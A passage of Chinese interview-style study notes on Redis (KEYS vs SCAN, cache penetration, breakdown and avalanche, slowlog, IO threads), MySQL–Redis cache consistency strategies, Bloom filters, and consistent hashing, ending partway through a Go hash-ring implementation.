直接使用 keys 命令查询，但是如果是在生产环境下使用会出现一个问题，keys 命令是遍历查询的，查询的时间复杂度为 O(n)，数据量越大查询时间越长。而且 Redis 是单线程，keys 指令会导致线程阻塞一段时间，会导致线上 Redis 停顿一段时间，直到 keys 执行完毕才能恢复。这在生产环境是不允许的。除此之外，需要注意的是，这个命令没有分页功能，会一次性查询出所有符合条件的 key 值，会发现查询结果非常大，输出的信息非常多。所以不推荐使用这个命令。

**2. 使用 scan 命令**

scan 命令可以实现和 keys 一样的匹配功能，但是 scan 命令在执行的过程不会阻塞线程，并且查找的数据可能存在重复，需要客户端操作去重。因为 scan 是通过游标方式查询的，所以不会导致 Redis 出现假死的问题。Redis 查询过程中会把游标返回给客户端，单次返回空值且游标不为 0，则说明遍历还没结束，客户端继续遍历查询。scan 在检索的过程中，被删除的元素是不会被查询出来的，但是如果在迭代过程中有元素被修改，scan 不能保证查询出对应元素。相对来说，scan 指令查找花费的时间会比 keys 指令长。

**对方接着追问：如果这个redis正在给线上的业务提供服务，那使用keys指令会有什么问题？**

这个时候你要回答redis关键的一个特性：redis的单线程的。keys指令会导致线程阻塞一段时间，线上服务会停顿，直到指令执行完毕，服务才能恢复。这个时候可以使用scan指令，scan指令可以无阻塞的提取出指定模式的key列表，但是会有一定的重复概率，在客户端做一次去重就可以了，但是整体所花费的时间会比直接用keys指令长。

#### 缓存穿透

缓存穿透指查询一个数据库一定不存在的数据。比如发起id为'-1'的数据或者id特别大不存在的数据，这时的用户可能是攻击者，攻击会导致数据库压力过大。

##### 解决方案

- 接口层增加校验，比如用户鉴权校验，id做基础校验，id<=0的直接拦截
- 缓存取不到的数据，将key-value对写成key-null并放入缓存中，缓存有效时间设置短一点，比如30s，这样可以防止攻击用户反复用同一个id暴力攻击。
- **使用布隆过滤器**:将查询的参数都存储到一个 bitmap 中，在查询缓存前，再找个新的 bitmap，在里面对参数进行验证。如果验证的 bitmap 中存在，则进行底层缓存的数据查询，如果 bitmap 中不存在查询参数，则进行拦截，不再进行缓存的数据查询。
- **缓存空对象**:如果从数据库查询的结果为空，依然把这个结果进行缓存，那么当用 key 获取数据时，即使数据不存在，Redis 也可以直接返回结果，避免多次访问数据库。但是缓存空值的缺点是：
  - 如果存在黑客恶意的随机访问，造成缓存过多的空值，那么可能造成很多内存空间的浪费。但是也可以对这些数据设置很短的过期时间来控制；
  - 如果查询的 key 对应的 Redis 缓存空值没有过期，数据库这时有了新数据，那么会出现数据库和缓存数据不一致的问题。但是可以保证当数据库有数据后更新缓存进行解决。

#### 缓存击穿

缓存击穿是指缓存中没有但是数据库中有的数据（一般指缓存时间到期），这时由于并发用户很多，同时读缓存没读到数据，又同时去数据库读取数据，引起数据库压力瞬间增大，造成过大压力。

##### 解决方案

- 设置热点数据永不过期
- 加互斥锁，这样在第一个进行查询的时候，其他查询无法到达数据库，当第一个查询结束之后，缓存中已经有了该数据。

#### 缓存雪崩

缓存雪崩是指缓存中数据有大批量到过期时间，而查询数据量巨大，引起数据库压力多大甚至宕机。和缓存击穿不同的是，缓存击穿指并发查一条数据，缓存雪崩是指不同数据同时都过期了，进而都去查询数据库。

##### 解决方案

- 将缓存数据的过期时间设置随机，防止同一时间内大量数据同时过期。
- 如果缓存数据库是分布式部署，将热点数据均匀分布在不同的缓存数据库中，防止因为一台缓存服务器宕机导致的缓存雪崩
- 设置热点数据永不过期

### 如何处理 Redis 集群中 big key 和 hot key？

对于 big key 先分析业务存在大键值是否合理，如果不合理我们可以把它们拆分为多个小的存储。或者看是否可以使用别的存储介质存储这种 big key 解决占用内存空间大的问题。

对于 hot key 我们可以在其他机器上复制这个 key 的备份，让请求进来的时候，去随机的到各台机器上访问缓存。所以剩下的问题就是如何做到让请求平均的分布到各台机器上。

## Redis管道

使用 pipeline（管道）的好处在于可以将多次 I/O 往返的时间缩短为一次，但是要求管道中执行的指令间没有因果关系。

用 pipeline 的原因在于可以实现请求/响应服务器的功能，当客户端尚未读取旧响应时，它也可以处理新的请求。如果客户端存在多个命令发送到服务器时，那么客户端无需等待服务端的每次响应才能执行下个命令，只需最后一步从服务端读取回复即可。

## Redis通讯协议

Redis 客户端和 Redis 服务器通信时使用的是 RESP（Redis 序列化协议）通讯协议，该协议是专门为 Redis 设计的，但是也可以用于其他客户端和服务器软件项目中。

RESP 的特点为：实现简单、快速解析、可读性好。

## Redis 慢查询是什么？通过什么配置？

慢查询是指系统执行命令之后，当计算系统执行的指令时间超过设置的阀值，该命令就会被记录到慢查询中，该命令叫做慢指令。

Redis 慢查询的参数配置有：

**1. slowlog-log-slower-than**

该参数的作用为设置慢查询的阈值，当命令执行时间超过这个阈值就认为是慢查询。单位为微妙，默认为 10000。

可以根据自己线上的并发量进行调整这个值。如果存在高流量的场景，那么建议设置这个值为 1 毫秒，因为每个命令执行的时间如果超过 1 毫秒，那么 Redis 的每秒操作数最多只能到 1000。

**2. slowlog-max-len**

该参数的作用为设置慢查询日志列表的最大长度，当慢查询日志列表处于最大长度时，最早插入的一个命令将会被从列表中移除。

##  Redis 如何做内存优化？

内存优化可以从以下几点进行：

- Redis 对所有数据都进行 redisObject 封装；
- 对键、值对象的长度进行缩减，简化键名，提高内存使用效率；
- 减少 key 的数量，尽量使用哈希数据类型；
- 共享对象池，并设置空间极限值。

## Redis 的内存用完了会发生什么？

如果 Redis 的内存使用达到了 redis.conf 配置文件中的设置上限，执行 Redis 的写命令会返回错误信息，但是还是支持读操作。解决这个问题的办法是，可以开启 Redis 的淘汰机制，当 Redis 内存达到上限时可以根据配置的策略删除一些数据，防止内存用完。

## 简单介绍一下 Redis 的内存管理方式有哪些？

内存管理方式主要有两个，一是控制内存上限；二是优化回收策略，对内存回收。

##  Redis 是单线程的，如何提高多核 CPU 的利用率？

可以在同一个服务器部署多个 Redis 的实例，并把他们当作不同的服务器来使用，在某些时候，无论如何一个服务器是不够的，所以，如果你想使用多个 CPU，你可以考虑一下分片（shard）。

## Redis6.0新特性，支持多线程

主要特性如下：

1. 多线程处理网络 IO；
2. 客户端缓存；
3. 细粒度权限控制（ACL）；
4. `RESP3` 协议的使用；
5. 用于复制的 RDB 文件不在有用，将立刻被删除；
6. RDB 文件加载速度更快；

**架构图如下**：

![图片来源：后端研究所](https://segmentfault.com/img/remote/1460000040376114)

> 主线程与 IO 多线程是如何实现协作呢？

如下图：

![Redis多线程与IO线程](https://segmentfault.com/img/remote/1460000040376115)

**主要流程**：

1. 主线程负责接收建立连接请求，获取 `socket` 放入全局等待读处理队列；
2. 主线程通过轮询将可读 `socket` 分配给 IO 线程；
3. 主线程阻塞等待 IO 线程读取 `socket` 完成；
4. 主线程执行 IO 线程读取和解析出来的 Redis 请求命令；
5. 主线程阻塞等待 IO 线程将指令执行结果回写回 `socket`完毕；
6. 主线程清空全局队列，等待客户端后续的请求。

思路：**将主线程 IO 读写任务拆分出来给一组独立的线程处理，使得多个 socket 读写可以并行化，但是 Redis 命令还是主线程串行执行。**

# MySQL和Redis的数据一致性问题

## **针对只读缓存（更新数据库+删除缓存）**

只读缓存：新增数据时，直接写入数据库；更新（修改/删除）数据时，先删除缓存。后续访问这些增删改的数据时，会发生缓存缺失，进而查询数据库，更新缓存。

* **新增数据时** ，写入数据库；访问数据时，缓存缺失，查数据库，更新缓存（始终是处于“数据一致”的状态，不会发生数据不一致性问题)

  ![img](https://s4.51cto.com/oss/202110/14/fd0e2ff304989a1899116d760ef211ca.jpg)

* **更新（修改/删除）数据时** ，会有个时序问题：更新数据库与删除缓存的顺序（这个过程会发生数据不一致性问题）。在更新数据的过程中，可能会有如下问题：

  * 无并发请求下，其中一个操作失败的情况。
  * 并发请求下，其他线程可能会读到旧值

  因此，要想达到数据一致性，需要保证两点： 

  * 无并发请求下，保证A和B步骤都能成功执行。
  * 并发请求下，在A和B步骤的间隔中，避免或消除其他线程的影响。

接下来，我们针对有/无并发场景，进行分析并使用不同的策略。

### 无并发情况

无并发请求下，在更新数据库和删除缓存值的过程中，因为操作被拆分成两步，那么就很有可能存在“步骤1成功，步骤2失败” 的情况发生（由于单线程中步骤1和步骤2是串行执行的，不太可能会发生 “步骤2成功，步骤1失败” 的情况）。

*  **先删除缓存，再更新数据库**

![img](https://s3.51cto.com/oss/202110/14/4853f559228c23e023769e64f76d08b5.jpg)

* **先更新数据库，再删除缓存**

![img](https://s6.51cto.com/oss/202110/14/14cfd66a7fe35f8f0da6fe1082065a95.jpg)

![img](https://s6.51cto.com/oss/202110/14/57d252653c4d204e54f7f1f3abfb5d4d.jpg)

**解决策略**：

* **消息队列+异步重试**

无论使用哪一种执行时序，可以在执行步骤1时，将步骤2的请求写入消息队列，当步骤2失败时，就可以使用重试策略，对失败操作进行“补偿”。

[![img](https://s6.51cto.com/oss/202110/14/3abe40e492008a2ea6cce2790c20b64c.jpg)](https://s6.51cto.com/oss/202110/14/3abe40e492008a2ea6cce2790c20b64c.jpg)

**具体步骤如下：**

1. 把要删除的缓存值或者是要更新的数据库值暂存到消息队列中（例如使用Kafka消息队列）
2. 当删除缓存值或者是更新数据库值成功时，把这些值从消息队列中去除，以免重复操作。
3. 当删除缓存值或者是更新数据库值失败时，执行失败策略，重试服务从消息队列中重新读取这些值，然后再次进行删除或更新。
4. 删除或者更新失败时，需要再次进行重试，重试超过的一定次数。向业务层发送报错信息。

* **订阅Binlog变更日志**

**具体步骤如下：**

1. 创建更新缓存服务，接收数据变更的MQ消息，然后消费消息，更新/删除Redis中的缓存数据。
2. 使用Binlog实时更新/删除Redis缓存。利用Canal，即将负责更新缓存的服务伪装成一个MySQL的从节点，从MySQL接收Binlog，解析Binlog之后，得到实时的数据变更信息，然后根据变更信息去更新/删除Redis缓存。
3. MQ+Canal策略，将Canal Server接收到的Binlog数据直接投递到MQ进行解耦，使用MQ异步消费Binlog日志，以此进行数据同步。

不管用MQ/Canal或者MQ+Canal的策略来异步更新缓存，对整个更新服务的数据可靠性和实时性要求都比较高，如果产生数据丢失或者更新延时情况，会造成MySQL和Redis中的数据不一致。因此，使用这种策略时，需要考虑出现不同步问题时的降级或补偿方案。

### 高并发情况:

使用以上策略后，可以保证在单线程/无并发场景下的数据一致性。但是，在高并发场景下，由于数据库层面的读写并发，会引发的数据库与缓存数据不一致的问题（本质是后发生的读请求先返回了）

* **先删除缓存，再更新数据库**

假设线程A删除缓存值后，由于网络延迟等原因导致未及更新数据库，而此时，线程B开始读取数据时会发现缓存缺失，进而去查询数据库。而当线程B从数据库读取完数据、更新了缓存后，线程A才开始更新数据库，此时，会导致缓存中的数据是旧值，而数据库中的是最新值，产生“数据不一致”。其本质就是，本应后发生的“B线程-读请求”先于“A线程-写请求”执行并返回了。

[![img](https://s5.51cto.com/oss/202110/14/6d3eaec67fbb960b3aef50da46ad25e7.jpg)](https://s5.51cto.com/oss/202110/14/6d3eaec67fbb960b3aef50da46ad25e7.jpg)

或者

[![img](https://s5.51cto.com/oss/202110/14/a7ac1a1e18d3d09f787d3b40f3029404.jpg)](https://s5.51cto.com/oss/202110/14/a7ac1a1e18d3d09f787d3b40f3029404.jpg)

**解决策略：**

设置缓存过期时间+延时双删

通过设置缓存过期时间，若发生上述淘汰缓存失败的情况，则在缓存过期后，读请求仍然可以从DB中读取最新数据并更新缓存，可减小数据不一致的影响范围。虽然在一定时间范围内数据有差异，但可以保证数据的最终一致性。

此外，还可以通过延时双删进行保障：在线程A更新完数据库值以后，让它先sleep一小段时间，确保线程B能够先从数据库读取数据，再把缺失的数据写入缓存，然后，线程A再进行删除。后续其它线程读取数据时，发现缓存缺失，会从数据库中读取最新值。

**先删除缓存值再更新数据库，有可能导致请求因缓存缺失而访问数据库，给数据库带来压力，也就是缓存穿透的问题。针对缓存穿透问题，可以用缓存空结果、布隆过滤器进行解决。**

* **先更新数据库，再删除缓存**

如果线程A更新了数据库中的值，但还没来得及删除缓存值，线程B就开始读取数据了，那么此时，线程B查询缓存时，发现缓存命中，就会直接从缓存中读取旧值。其本质也是，本应后发生的“B线程-读请求”先于“A线程-删除缓存”执行并返回了。

[![img](https://s6.51cto.com/oss/202110/14/47a31ea37ae61ebd43ba5e300114f514.jpg)](https://s6.51cto.com/oss/202110/14/47a31ea37ae61ebd43ba5e300114f514.jpg)

或者，在“先更新数据库，再删除缓存”方案下，“读写分离+主从库延迟”也会导致不一致：

[![img](https://s6.51cto.com/oss/202110/14/ad46a9313011ece99c006d4b2fd55b4c.jpg)](https://s6.51cto.com/oss/202110/14/ad46a9313011ece99c006d4b2fd55b4c.jpg)

**解决方案：**

1.  **延迟消息**：凭借经验发送「延迟消息」到队列中，延迟删除缓存，同时也要控制主从库延迟，尽可能降低不一致发生的概率。

2. **订阅binlog，异步删除**：通过数据库的binlog来异步淘汰key，利用工具(canal)将binlog日志采集发送到MQ中，然后通过ACK机制确认处理删除缓存。

3. **删除消息写入数据库**：通过比对数据库中的数据，进行删除确认，先更新数据库再删除缓存，有可能导致请求因缓存缺失而访问数据库，给数据库带来压力，也就是缓存穿透的问题。针对缓存穿透问题，可以用缓存空结果、布隆过滤器进行解决。

4. **加锁**：更新数据时，加写锁；查询数据时，加读锁。

   [![img](https://s6.51cto.com/oss/202110/14/a7f25f27c5ae70451d1e19ccc64770df.jpg)](https://s6.51cto.com/oss/202110/14/a7f25f27c5ae70451d1e19ccc64770df.jpg)

**建议：**

优先使用“先更新数据库再删除缓存”的执行时序，原因主要有两个：

1. 先删除缓存值再更新数据库，有可能导致请求因缓存缺失而访问数据库，给数据库带来压力。
2. 业务应用中读取数据库和写缓存的时间有时不好估算，进而导致延迟双删中的sleep时间不好设置。

## **针对读写缓存（更新数据库+更新缓存）**

**读写缓存** ：增删改在缓存中进行，并采取相应的回写策略，同步数据到数据库中。

**同步直写** ：使用事务，保证缓存和数据更新的原子性，并进行失败重试（如果Redis本身出现故障，会降低服务的性能和可用性）

**异步回写** ：写缓存时不同步写数据库，等到数据从缓存中淘汰时，再写回数据库（没写回数据库前，缓存发生故障，会造成数据丢失）

该策略在秒杀场中有见到过，业务层直接对缓存中的秒杀商品库存信息进行操作，一段时间后再回写数据库。

**一致性** ：同步直写>异步回写，因此，对于读写缓存，要保持数据强一致性的主要思路是：利用同步直写，同步直写也存在两个操作的时序问题：更新数据库和更新缓存。

### 无并发情况

![img](https://s3.51cto.com/oss/202110/14/5169ae54c721acc40616d9140db49960.jpg)

### 高并发情况

有四种场景会造成数据不一致：

[![img](https://s6.51cto.com/oss/202110/14/15ed52df20fc8ba88a3df411383c1ef9.jpg)](https://s6.51cto.com/oss/202110/14/15ed52df20fc8ba88a3df411383c1ef9.jpg)

**针对场景1和2的解决方案是**：保存请求对缓存的读取记录，延时消息比较，发现不一致后，做业务补偿。针对场景3和4的解决方案是：对于写请求，需要配合分布式锁使用。写请求进来时，针对同一个资源的修改操作，先加分布式锁，保证同一时间只有一个线程去更新数据库和缓存；没有拿到锁的线程把操作放入到队列中，延时处理。用这种方式保证多个线程操作同一资源的顺序性，以此保证一致性。

[![img](https://s4.51cto.com/oss/202110/14/7bc38e0a140f4e8be1ccb7f5ff81de90.jpg)](https://s4.51cto.com/oss/202110/14/7bc38e0a140f4e8be1ccb7f5ff81de90.jpg)

其中，分布式锁的实现可以使用以下策略：

[![img](https://s4.51cto.com/oss/202110/14/4cf7557f5262cc097c874dbf80f1cd10.jpg)](https://s4.51cto.com/oss/202110/14/4cf7557f5262cc097c874dbf80f1cd10.jpg)



# 布隆过滤器

## 简介

本质上布隆过滤器是一种数据结构，比较巧妙的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 **“某样东西一定不存在或者可能存在”**。

相比于传统的 List、Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的结果是概率性的，而不是确切的。

## HashMap和布隆过滤器

hashmap存储容量较高时，考虑到负载因子的存在，空间无法被全部使用，当数据量上亿时，hashmap占据的内存大小就比较可观了。比如说你的数据集存储在远程服务器上，本地服务接受输入，而数据集非常大不可能一次性读进内存构建 HashMap 的时候，也会存在问题。

## 布隆过滤器的数据结构

布隆过滤器是一个 bit 向量或者说 bit 数组，长这样：

![img](https://pic3.zhimg.com/80/v2-530c9d4478398718c15632b9aa025c36_720w.jpg)

如果我们要映射一个值到布隆过滤器中，我们需要使用**多个不同的哈希函数**生成**多个哈希值，**并对每个生成的哈希值指向的 bit 位置 1，例如针对值 “baidu” 和三个不同的哈希函数分别生成了哈希值 1、4、7，则上图转变为：

![img](https://pic4.zhimg.com/80/v2-a0ee721daf43f29dd42b7d441b79d227_720w.jpg)

Ok，我们现在再存一个值 “tencent”，如果哈希函数返回 3、4、8 的话，图继续变为：

![img](https://pic3.zhimg.com/80/v2-c0c20d8e06308aae1578c16afdea3b6a_720w.jpg)

值得注意的是，4 这个 bit 位由于两个值的哈希函数都返回了这个 bit 位，因此它被覆盖了。现在我们如果想查询 “dianping” 这个值是否存在，哈希函数返回了 1、5、8三个值，结果我们发现 5 这个 bit 位上的值为 0，**说明没有任何一个值映射到这个 bit 位上**，因此我们可以很确定地说 “dianping” 这个值不存在。而当我们需要查询 “baidu” 这个值是否存在的话，那么哈希函数必然会返回 1、4、7，然后我们检查发现这三个 bit 位上的值均为 1，那么我们可以说 “baidu” **存在了么？答案是不可以，只能是 “baidu” 这个值可能存在。**

这是为什么呢？答案跟简单，因为随着增加的值越来越多，被置为 1 的 bit 位也会越来越多，这样某个值 “taobao” 即使没有被存储过，但是万一哈希函数返回的三个 bit 位都被其他值置位了 1 ，那么程序还是会判断 “taobao” 这个值存在。

## 是否支持删除

传统的布隆过滤器并不支持删除操作。但是名为 Counting Bloom filter 的变种可以用来测试元素计数个数是否绝对小于某个阈值，它支持元素删除。

## 如何选择哈希函数个数和布隆过滤器的长度

很显然，过小的布隆过滤器很快所有的 bit 位均为 1，那么查询任何值都会返回“可能存在”，起不到过滤的目的了。布隆过滤器的长度会直接影响误报率，布隆过滤器越长其误报率越小。

另外，哈希函数的个数也需要权衡，个数越多则布隆过滤器 bit 位置位 1 的速度越快，且布隆过滤器的效率越低；但是如果太少的话，那我们的误报率会变高。

![img](https://pic4.zhimg.com/80/v2-05d4a17ec47911d9ff0e72dc788d5573_720w.jpg)k 为哈希函数个数，m 为布隆过滤器长度，n 为插入的元素个数，p 为误报率

如何选择适合业务的 k 和 m 值呢，这里直接贴一个公式：

![img](https://pic1.zhimg.com/80/v2-1ed5b79aa7ac2e9cd66c83690fdbfcf0_720w.jpg)

如何推导这个公式这里只是提一句，因为对于使用来说并没有太大的意义，你让一个高中生来推会推得很快。k 次哈希函数某一 bit 位未被置为 1 的概率为：

![[公式]](https://www.zhihu.com/equation?tex=%281-%5Cfrac%7B1%7D%7Bm%7D%29%5E%7Bk%7D)

插入n个元素后依旧为 0 的概率和为 1 的概率分别是：

![[公式]](https://www.zhihu.com/equation?tex=%5Cleft%28+1-%5Cfrac%7B1%7D%7Bm%7D+%5Cright%29%5E%7Bnk%7D) ![[公式]](https://www.zhihu.com/equation?tex=1-+%5Cleft%28+1-%5Cfrac%7B1%7D%7Bm%7D+%5Cright%29%5E%7Bnk+%7D)

标明某个元素是否在集合中所需的 k 个位置都按照如上的方法设置为 1，但是该方法可能会使算法错误的认为某一原本不在集合中的元素却被检测为在该集合中（False Positives），该概率由以下公式确定

![[公式]](https://www.zhihu.com/equation?tex=%5Cleft%5B+1-+%5Cleft%28+1-%5Cfrac%7B1%7D%7Bm%7D+%5Cright%29%5E%7Bnk%7D+%5Cright%5D%5E%7Bk%7D%5Capprox%5Cleft%28+1-e%5E%7B-kn%2Fm%7D+%5Cright%29%5E%7Bk%7D)

## 布隆过滤器的优缺点

### 优点

- 由于存储的是二进制数据，所以占用的空间很小
- 它的插入和查询速度是非常快的，时间复杂度是O（K），可以联想一下HashMap的过程
- 保密性很好，因为本身不存储任何原始数据，只有二进制数据

### 缺点

* 存在误判：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合（false positive）。因此，Bloom Filter不适合那些“零错误”的应用场合。而在能容忍低错误率的应用场合下，Bloom Filter通过极少的错误换取了存储空间的极大节省。
* 删除困难

## 应用场景

利用布隆过滤器减少磁盘 IO 或者网络请求，因为一旦一个值必定不存在的话，我们可以不用进行后续昂贵的查询请求。

另外，既然你使用布隆过滤器来加速查找和判断是否存在，那么性能很低的哈希函数不是个好选择，推荐 MurmurHash、Fnv 这些。

### 大Value拆分

Redis 因其支持 setbit 和 getbit 操作，且纯内存性能高等特点，因此天然就可以作为布隆过滤器来使用。但是布隆过滤器的不当使用极易产生大 Value，增加 Redis 阻塞风险，因此生成环境中建议对体积庞大的布隆过滤器进行拆分。

拆分的形式方法多种多样，但是本质是不要将 Hash(Key) 之后的请求分散在多个节点的多个小 bitmap 上，而是应该拆分成多个小 bitmap 之后，对一个 Key 的所有哈希函数都落在这一个小 bitmap 上。

# 一致性哈希算法

## 传统哈希取模算法的局限性

* 节点减少的场景

**在分布式多节点系统中，出现故障很常见。任何节点都可能在没有任何事先通知的情况下挂掉，针对这种情况我们期望系统只是出现性能降低，正常的功能不会受到影响。** 对于原始示例，当节点出现故障时会发生什么？原始示例中有的 3 个节点，假设其中 1 个节点出现故障，这时节点数发生了变化，节点个数从 3 减少为 2，此时表格的状态发生了变化：

![ch-two-nodes-hash.jpg](https://segmentfault.com/img/bVbA7ay)

很明显节点的减少会导致键与节点的映射关系发生变化，这个变化对于新的键来说并不会产生任何影响，但对于已有的键来说，将导致节点映射错误，以 “semlinker” 为例，变化前系统有 3 个节点，该键对应的节点编号为 1，当出现故障时，节点数减少为 2 个，此时该键对应的节点编号为 0。

* 节点增加的场景

**在分布式多节点系统中，对于某些场景比如节日大促，就需要对服务节点进行扩容，以应对突发的流量。** 对于原始示例，当增加节点会发生什么？原始示例中有的 3 个节点，假设进行扩容临时增加了 1 个节点，这时节点数发生了变化，节点个数从 3 增加为 4 个，此时表格的状态发生了变化：

![ch-four-nodes-hash.jpg](https://segmentfault.com/img/bVbA7az)

很明显节点的增加也会导致键与节点的映射关系发生变化，这个变化对于新的键来说并不会产生任何影响，但对于已有的键来说，将导致节点映射错误，同样以 “semlinker” 为例，变化前系统有 3 个节点，该键对应的节点编号为 1，当增加节点时，节点数增加为 4 个，此时该键对应的节点编号为 2。

当集群中节点的数量发生变化时，之前的映射规则就可能发生变化。如果集群中每个机器提供的服务没有差别，这不会有什么影响。**但对于分布式缓存这种的系统而言，映射规则失效就意味着之前缓存的失效，若同一时刻出现大量的缓存失效，则可能会出现 “缓存雪崩”，这将会造成灾难性的后果。**

**要解决此问题，我们必须在其余节点上重新分配所有现有键，这可能是非常昂贵的操作，并且可能对正在运行的系统产生不利影响。当然除了重新分配所有现有键的方案之外，还有另一种更好的方案即使用一致性哈希算法。**

## 一致性哈希算法简介

一致性哈希算法是一种特殊的哈希算法，在移除或者添加一个服务器时，能够尽可能小地改变已存在的服务请求与处理请求服务器之间的映射关系。一致性哈希解决了简单哈希算法在分布式[哈希表](https://link.segmentfault.com/?enc=jMpJKtLH0iJ8JGhOMZl9ng%3D%3D.7k4Gf%2Ff9mzEZ6LAPQH%2FHrd9aul5zThnet6MvcMurTOuYdfDGZsbRtixdcvJz5LildJD3kZvkN50EG9c9ifcj6I%2BGnbIKPecMfn2MNjyPLTM%3D)（Distributed Hash Table，DHT）中存在的动态伸缩等问题 。

## 一致性哈希算法的优点

* 可扩展性：一致性哈希算法保证了增加或减少服务器时，数据存储的改变最少，相比传统哈希算法大大节省了数据移动的开销 。
* 更好地适应数据的快速增长：采用一致性哈希算法分布数据，当数据不断增长时，部分虚拟节点中可能包含很多数据、造成数据在虚拟节点上分布不均衡，此时可以将包含数据多的虚拟节点分裂，这种分裂仅仅是将原有的虚拟节点一分为二、不需要对全部的数据进行重新哈希和划分。虚拟节点分裂后，如果物理服务器的负载仍然不均衡，只需在服务器之间调整部分虚拟节点的存储分布。这样可以随数据的增长而动态的扩展物理服务器的数量，且代价远比传统哈希算法重新分布所有数据要小很多

## 一致性哈希算法和传统哈希算法的关系

- 平衡性：是指 hash 的结果应该平均分配到各个节点，这样从算法上解决了负载均衡问题。
- 单调性：是指在新增或者删减节点时，不影响系统正常运行。
- 分散性：是指数据应该分散地存放在分布式集群中的各个节点（节点自己可以有备份），不必每个节点都存储所有的数据。

## 一致性哈希算法的原理

一致性哈希算法通过一个叫作一致性哈希环的数据结构实现。

### 将对象放置到哈希环

假设我们有 "semlinker"、"kakuqo"、"lolo"、"fer" 四个对象，分别简写为 o1、o2、o3 和 o4，然后使用哈希函数计算这个对象的 hash 值，值的范围是 [0, 2^32-1]：

![hash-ring-hash-objects.jpg](https://segmentfault.com/img/bVbA7aB)

图中对象的映射关系如下：

```abnf
hash(o1) = k1; hash(o2) = k2;
hash(o3) = k3; hash(o4) = k4;
```

### 将服务器放置到哈希环

接着使用同样的哈希函数，我们将服务器也放置到哈希环上，可以选择服务器的 IP 或主机名作为键进行哈希，这样每台服务器就能确定其在哈希环上的位置。这里假设我们有 3 台缓存服务器，分别为 cs1、cs2 和 cs3：

![hash-ring-hash-servers.jpg](https://segmentfault.com/img/bVbA7aG)

图中服务器的映射关系如下：

```bash
hash(cs1) = t1; hash(cs2) = t2; hash(cs3) = t3; # Cache Server
```

### 为对象选择服务器

**将对象和服务器都放置到同一个哈希环后，在哈希环上顺时针查找距离这个对象的 hash 值最近的机器，即是这个对象所属的机器。** 以 o2 对象为例，顺序针找到最近的机器是 cs2，故服务器 cs2 会缓存 o2 对象。而服务器 cs1 则缓存 o1，o3 对象，服务器 cs3 则缓存 o4 对象。

![hash-ring-objects-servers.jpg](https://segmentfault.com/img/bVbA7aH)

### 服务器增加的情况

假设由于业务需要，我们需要增加一台服务器 cs4，经过同样的 hash 运算，该服务器最终落于 t1 和 t2 服务器之间，具体如下图所示：

![hash-ring-add-server.jpg](https://segmentfault.com/img/bVbA7aI)

对于上述的情况，只有 t1 和 t2 服务器之间的对象需要重新分配。在以上示例中只有 o3 对象需要重新分配，即它被重新到 cs4 服务器。在前面我们已经分析过，如果使用简单的取模方法，当新添加服务器时可能会导致大部分缓存失效，而使用一致性哈希算法后，这种情况得到了较大的改善，因为只有少部分对象需要重新分配。

### 服务器减少的情况

假设 cs3 服务器出现故障导致服务下线，这时原本存储于 cs3 服务器的对象 o4，需要被重新分配至 cs2 服务器，其它对象仍存储在原有的机器上。

![hash-ring-remove-server.jpg](https://segmentfault.com/img/bVbA7aJ)

### 虚拟节点

到这里一致性哈希的基本原理已经介绍完了，但对于新增服务器的情况还存在一些问题。新增的服务器 cs4 只分担了 cs1 服务器的负载，服务器 cs2 和 cs3 并没有因为 cs4 服务器的加入而减少负载压力。如果 cs4 服务器的性能与原有服务器的性能一致甚至可能更高，那么这种结果并不是我们所期望的。

**针对这个问题，我们可以通过引入虚拟节点来解决负载不均衡的问题。即将每台物理服务器虚拟为一组虚拟服务器，将虚拟服务器放置到哈希环上，如果要确定对象的服务器，需先确定对象的虚拟服务器，再由虚拟服务器确定物理服务器。**

### 一致性哈希算法实现

这里我们只介绍不带虚拟节点的一致性哈希算法实现：

```go
package hashring

import (
	"crypto/sha1"
	"sync"
	//	"hash"
	"math"
	"sort"
	"strconv"
)

const (
	//DefaultVirualSpots default virual spots
	DefaultVirualSpots = 400
)

type node struct {
	nodeKey   string
	spotValue uint32
}

type nodesArray []node

func (p nodesArray) Len() int           { return len(p) }
func (p nodesArray) Less(i, j int) bool { return p[i].spotValue < p[j].spotValue }
func (p nodesArray) Swap(i, j int)      { p[i], p[j] = p[j], p[i] }
func (p nodesArray) Sort()              { sort.Sort(p) }

//HashRing store nodes and weigths
type HashRing struct {
	virualSpots int
	nodes       nodesArray
	weights     map[string]int
	mu          sync.RWMutex
}

//NewHashRing create a hash ring with virual spots
func NewHashRing(spots int) *HashRing {
	if spots == 0 {
		spots = DefaultVirualSpots
	}

	h := &HashRing{
		virualSpots: spots,
		weights:     make(map[string]int),
	}
	return h
}

//AddNodes add nodes to hash ring
func (h *HashRing) AddNodes(nodeWeight map[string]int) {
	h.mu.Lock()
	defer h.mu.Unlock()
	for nodeKey, w := range nodeWeight {
		h.weights[nodeKey] = w
	}
	h.generate()
}

//AddNode add node to hash ring
func (h *HashRing) AddNode(nodeKey string, weight int) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.weights[nodeKey] = weight
	h.generate()
}

//RemoveNode remove node
func (h *HashRing) RemoveNode(nodeKey string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	delete(h.weights, nodeKey)
	h.generate()
}

//UpdateNode update node with weight
func (h *HashRing) UpdateNode(nodeKey string, weight int) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.weights[nodeKey] = weight
	h.generate()
}

func (h *HashRing) generate() {
	var totalW int
	for _, w := range h.weights {
		totalW += w
	}

	totalVirtualSpots := h.virualSpots * len(h.weights)
	h.nodes = nodesArray{}

	for nodeKey, w := range h.weights {
		spots := int(math.Floor(float64(w) / float64(totalW) * float64(totalVirtualSpots)))
		for i := 1; i <= spots; i++ {
			hash := sha1.New()
			hash.Write([]byte(nodeKey + ":" + strconv.Itoa(i)))
			hashBytes := hash.Sum(nil)
			n := node{
				nodeKey:   nodeKey,
				spotValue: genValue(hashBytes[6:10]),
			}
			h.nodes = append(h.nodes, n)
			hash.Reset()
		}
	}
	h.nodes.Sort()
}

func genValue(bs []byte) uint32 {
	if len(bs) < 4 {
		return 0
	}
	v := (uint32(bs[3]) << 24) | (uint32(bs[2]) << 16) | (uint32(bs[1]) << 8) | (uint32(bs[0]))
	return v
}

//GetNode get node with key
func (h *HashRing) GetNode(s string) string {
	h.mu.RLock()
	defer h.mu.RUnlock()
	if len(h.nodes) == 0 {
		return ""
	}

	hash := sha1.New()
	hash.Write([]byte(s))
	hashBytes := hash.Sum(nil)
